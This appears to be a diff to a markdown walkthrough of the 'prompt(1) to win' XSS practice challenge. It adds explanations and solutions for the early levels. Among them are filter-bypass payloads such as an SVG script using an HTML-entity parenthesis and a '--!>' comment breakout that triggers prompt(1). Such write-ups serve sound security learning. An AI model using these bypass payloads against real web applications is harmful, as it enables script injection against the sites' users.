@@ -1,5 +1,21 @@
 # prompt(1) to win
 ## 0 
+**Explain**
+
+<img width="500" src="https://user-images.githubusercontent.com/68285613/147735387-10fb0b9b-deb8-43d9-a7e3-f3289d47f0df.png">
+
+```HTML
+<input type="text" value="INPUT">
+```
+
+
+```">``` will close ```<input>``` first.
+
+Then attacker will be able to use prompt(1).
+
+
+<br>
+
 **Solve**
 
 ```HTML
@@ -10,13 +26,19 @@
 
 <br>
 
+<br>
+
 ## 1
 **Explain**
+
+<img width="500" src="https://user-images.githubusercontent.com/68285613/147735732-82fe3eb8-1eab-4d58-b603-408f06d90a15.png">
+
 
 ```JavaScript
 var stripTagsRE = /<\/?[^>]+>/gi;
 input = input.replace(stripTagsRE, '');
 ```
+
 Need to bypass the ```input.replace``` part.
 
 <br>
@@ -38,8 +60,12 @@ Need to bypass the ```input.replace``` part.
 
 <br>
 
+<br>
+
 ## 2
 **Explain**
+
+<img width="500" src="https://user-images.githubusercontent.com/68285613/147735779-aef522df-531e-46c8-8d08-2792f978598f.png">
 
 ```JavaScript
 input = input.replace(/[=(]/g, '');
@@ -73,23 +99,45 @@ By altering the tag ```<h1``` into other tags, might ended up being able to use 
 
 **Solve**
 
-<img width="500" src="https://user-images.githubusercontent.com/68285613/147732371-b7f0aed4-0777-4b5a-a56f-d01af8214cbf.png">
+```HTML
+<svg><script>prompt&#40;1)</script>
+```
+
+<img width="500" src="https://user-images.githubusercontent.com/68285613/147736127-dbe162cc-2d9d-4e90-ba2f-53a9b72ee76a.png">
 
 SVG is XML based, which means that every element is available within the SVG DOM.
+
+<br>
 
 <br>
 
 ## 3
 **Explain**
 
+<img width="500" src="https://user-images.githubusercontent.com/68285613/147735869-d4babbf5-7eb8-4c03-bf85-81e9864c331e.png">
+
 ```input = input.replace(/->/g, '_');```
 
+Will have use use something other than ```-->``` to close the comment.
 
 <br>
 
 **Solve**
 
+```HTML
+--!><svg onload=prompt(1)>
+```
+
 <img width="500" src="https://user-images.githubusercontent.com/68285613/147734370-19e288b3-e257-41cf-adac-8948e52d21ba.png">
+
+<br>
+
+<br>
+
+## 4
+**Explain**
+
+<img width="500" src="https://user-images.githubusercontent.com/68285613/147735285-58067794-8111-4094-a583-2cb3fc4dfab6.png">
 
 
 
